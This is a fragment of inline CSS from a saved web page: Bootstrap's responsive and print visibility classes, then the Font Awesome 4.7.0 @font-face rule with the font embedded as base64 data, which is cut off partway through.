        th.visible-md {
          display: table-cell !important;
        }
      }
      @media (min-width: 992px) and (max-width: 1199px) {
        .visible-md-block {
          display: block !important;
        }
      }
      @media (min-width: 992px) and (max-width: 1199px) {
        .visible-md-inline {
          display: inline !important;
        }
      }
      @media (min-width: 992px) and (max-width: 1199px) {
        .visible-md-inline-block {
          display: inline-block !important;
        }
      }
      @media (min-width: 1200px) {
        .visible-lg {
          display: block !important;
        }
        table.visible-lg {
          display: table !important;
        }
        tr.visible-lg {
          display: table-row !important;
        }
        td.visible-lg,
        th.visible-lg {
          display: table-cell !important;
        }
      }
      @media (min-width: 1200px) {
        .visible-lg-block {
          display: block !important;
        }
      }
      @media (min-width: 1200px) {
        .visible-lg-inline {
          display: inline !important;
        }
      }
      @media (min-width: 1200px) {
        .visible-lg-inline-block {
          display: inline-block !important;
        }
      }
      @media (max-width: 767px) {
        .hidden-xs {
          display: none !important;
        }
      }
      @media (min-width: 768px) and (max-width: 991px) {
        .hidden-sm {
          display: none !important;
        }
      }
      @media (min-width: 992px) and (max-width: 1199px) {
        .hidden-md {
          display: none !important;
        }
      }
      @media (min-width: 1200px) {
        .hidden-lg {
          display: none !important;
        }
      }
      .visible-print {
        display: none !important;
      }
      @media print {
        .visible-print {
          display: block !important;
        }
        table.visible-print {
          display: table !important;
        }
        tr.visible-print {
          display: table-row !important;
        }
        td.visible-print,
        th.visible-print {
          display: table-cell !important;
        }
      }
      .visible-print-block {
        display: none !important;
      }
      @media print {
        .visible-print-block {
          display: block !important;
        }
      }
      .visible-print-inline {
        display: none !important;
      }
      @media print {
        .visible-print-inline {
          display: inline !important;
        }
      }
      .visible-print-inline-block {
        display: none !important;
      }
      @media print {
        .visible-print-inline-block {
          display: inline-block !important;
        }
      }
      @media print {
        .hidden-print {
          display: none !important;
        }
      }
      /*# sourceMappingURL=bootstrap.min.css.map */

      /*!
 *  Font Awesome 4.7.0 by @davegandy - http://fontawesome.io - @fontawesome
 *  License - http://fontawesome.io/license (Font: SIL OFL 1.1, CSS: MIT License)
 */
      @font-face {
        font-family: "FontAwesome";
        src:/*savepage-url=../../fonts/fontawesome-webfont.eot?v=4.7.0*/ url();
        src:/*savepage-url=../../fonts/fontawesome-webfont.eot?#iefix&v=4.7.0*/ url() format("embedded-opentype"),
          /*savepage-url=../../fonts/fontawesome-webfont.woff2?v=4.7.0*/
            url(data:application/font-woff;base64,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